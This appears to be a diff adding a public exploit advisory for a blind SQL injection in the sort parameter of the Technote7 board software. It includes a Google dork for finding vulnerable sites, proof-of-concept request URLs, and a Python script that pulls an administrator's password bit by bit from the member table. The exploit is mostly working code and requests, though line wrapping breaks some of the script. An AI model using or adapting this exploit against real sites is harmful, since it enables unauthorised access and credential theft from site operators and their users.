@@ -1,0 +1,64 @@
+# Exploit Title: technote blind sql injection
+# Google Dork: inurl:/technote7/board.php?board=
+# Date: 2011.06.11
+# Author: BlueH4G (http://blueh4g.org)
+# Software Link:
+http://www.technote.co.kr/php/technote1/board.php?board=consult&command=skin_insert&exe=insert_down_shop
+# Version: technote7.2 > * && Mysql 3.x < *
+# Tested on: Windows & Linux everything
+
+============================================================================================================
+
+vulnerability :
+
+blind sql injection with order by option.
+
+i could control align data with sort variable with `case`.
+
+
+blueh4g.org/technote7/board.php?board=freeboard&sort=(case(select 1=1) when
+true then no else uid end) asc#
+
+-> sort by `no` column.
+
+
+blueh4g.org/technote7/board.php?board=freeboard&sort=(case(select 1=2) when
+true then no else uid end) asc#
+
+-> sort by `uid` column.
+
+
+============================================================================================================
+
+exploit :
+
+#!/usr/bin/python
+#-*- coding: utf-8 -*-
+# coded by BlueH4G _http://blueh4g.org_
+import urllib,re
+from time import sleep
+
+def main() :
+ chk = re.compile("true_title")
+ url_begin="
+http://t.blueh4g.org/technote7/board.php?board=freeboard&sort=(case%20("
+ url_end=")%20when%20true%20then%20no%20else%20uid%20end)%20asc%20limit%200,1%23"
+ result="result : "
+ for spos in range(1,14):
+  ch=0
+  for i in range(1,8) :
+   sleep(0.05)
+
+ query="select%20substr((select%20lpad(bin(ascii(substr(m_pass,"+str(spos)+",1))),7,0)%20from%20a_tn3_memberboard_list%20order%20by%20m_level%20desc%20limit%200,1),"+str(i)+",1)=1
+   data=urllib.urlopen(url_begin + query + url_end)
+   text=data.read()
+   if chk.search(text) :
+    ch += 2**(7-i)
+  result+=chr(ch)
+ print result
+main()
+
+============================================================================================================
+
+-- 
+## BlueH4G ##
